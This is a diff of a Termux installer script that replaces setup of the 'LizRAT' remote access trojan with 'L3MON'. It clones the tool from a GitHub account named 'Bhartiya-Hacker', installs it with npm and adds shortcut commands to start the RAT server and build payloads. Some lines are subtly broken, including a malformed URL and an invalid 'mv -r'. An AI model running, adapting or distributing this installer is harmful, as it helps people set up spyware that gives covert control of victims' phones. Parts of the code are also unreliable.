@@ -21,7 +21,7 @@ echo "${GRN}PRESS 'Y' When ASKED then PRESS ENTER${NC}"
 sleep 5
 
 pkg update && pkg upgrade
-pkg install wget -y
+pkg install git -y
 clear
 
 echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
@@ -33,31 +33,25 @@ echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━
 echo "${CYN}                                  By lUCIFER   ${NC}"
 
 if [ ! -d "$PREFIX/opt" ]; then
-  echo "${BLUE}Setting UP LzRAT${NC}"
+  echo "${BLUE}Setting UP L3MON${NC}"
   mkdir "$PREFIX/opt"
   echo "${GREEN}SETUP Complete${NC}"
 fi
 sleep 3
-if [ -d "$PREFIX/opt/lizrat" ]; then
-  echo "${CYAN}Existing lizrat directory Found! Removing it${NC}"
-  rm -rf "$PREFIX/opt/lizrat"
+if [ -d "$PREFIX/opt/l3mon" ]; then
+  echo "${CYAN}Existing l3mon directory Found! Removing it${NC}"
+  rm -rf "$PREFIX/opt/l3mon"
 fi
 sleep 5
 
-file="lizrat.zip"
-
-if [ -e "$file" ]; then
-  echo "${GREEN}File $file exists. NOT Downloading it${NC}"
-else
-  echo "${GREEN}$file does not exist. Downloading...${NC}"
-  wget -q "https:raw.githubusercontent.com/Bhartiya-Hacker/Liz-RAT/master/lizrat.zip" 
+if [ ! -d "$PWD/l3mon" ]; then
+  echo "${BLUE}Dowloading L3MON${NC}"
+  git clone https://github.com/Bhartiya-Hacker/L3MON
+  echo "${GREEN}L3MON Download complete${NC}"
 fi
-sleep 5
 
-clear
-echo "${GREEN}Compiling LizRat${NC}"
 sleep 6
-unzip lizrat.zip
+
 clear
 
 echo "${SAF}  ╭╮╱╱╱╱╱╱╱╭━━━╮╱╱╭╮╱╭━━╮╱╱╱╱╱╭╮╱╱╱╭╮╭╮        ${NC}"
@@ -69,7 +63,8 @@ echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━
 echo "${CYN}                                  By lUCIFER   ${NC}"
 
 echo "${YLW}Setting UP Directories${NC}"
-mv -f lizrat "$PREFIX/opt"
+mv -r L3MON/l3mon /$PREFIX/opt/
+rm -rf L3MON
 echo "${GRN}Directory SETUP Complete${NC}"
 sleep 5
 clear
@@ -138,11 +133,11 @@ echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣
 echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
 echo "${CYN}                                  By lUCIFER   ${NC}"
 
-echo "${YLW}Installing Lizrat${NC}"
+echo "${YLW}Installing L3MON${NC}"
 
 sleep 5
 
-npm install --prefix $PREFIX/opt/lizrat
+npm install --prefix $PREFIX/opt/l3mon
 
 clear
 
@@ -157,11 +152,11 @@ echo "${CYN}                                  By lUCIFER   ${NC}"
 echo "Creating Symlinks"
 sleep 5
 
-echo "pushd $PREFIX/opt/lizrat && pm2 start index.js && popd" > "$PREFIX/bin/liz"
-echo "pushd $PREFIX/opt/lizrat && pm2 stop index.js && popd" > "$PREFIX/bin/lizx"
-echo "pushd $PREFIX/opt/lizrat && ./builder.sh && popd" > "$PREFIX/bin/lizb"
+echo "pushd $PREFIX/opt/l3mon && pm2 start index.js && popd" > "$PREFIX/bin/l3mon"
+echo "pushd $PREFIX/opt/l3mon && pm2 stop index.js && popd" > "$PREFIX/bin/l3monx"
+echo "pushd $PREFIX/opt/l3mon && ./builder.sh && popd" > "$PREFIX/bin/l3monb"
 
-chmod +x "$PREFIX/bin/liz" "$PREFIX/bin/lizx" "$PREFIX/bin/lizb"
+chmod +x "$PREFIX/bin/l3mon" "$PREFIX/bin/l3monx" "$PREFIX/bin/l3monb"
 
 clear
 
@@ -173,7 +168,6 @@ echo "${GRN}  ┃╰━╯┃┃┃━━┫┃┃╰┫╭╮┃╰╮╭┫┣
 echo "${GRN}  ╰━━━┻┻━━━┻╯╰━┻╯╰┻━╯╰━━┻╯╰┻━━┻━┻╯╰┻━┻━┻━━┻╯   ${NC}"
 echo "${CYN}                                  By lUCIFER   ${NC}"
 
-echo "${GRN}Installation complete${NC}, ${SAF}Run Lizrat from Anywhere in TERMUX by executing 'liz'${NC}"
-echo "${SAf}Please REMOVE 'LizRat Dir' Present at HOME${NC}"
-echo "${CYN}To build payload execute 'lizb' Anywhere in TERMUX${NC}"
-echo "${SAF}To stop the Lizrat server execute 'lizx' Anywhere in TERMUX${NC}"
+echo "${GRN}Installation complete${NC}, ${SAF}Run L3MON from Anywhere in TERMUX by executing 'l3mon'${NC}"
+echo "${CYN}To build payload execute 'l3monb' Anywhere in TERMUX${NC}"
+echo "${SAF}To stop the L3MON server execute 'l3monx' Anywhere in TERMUX${NC}"
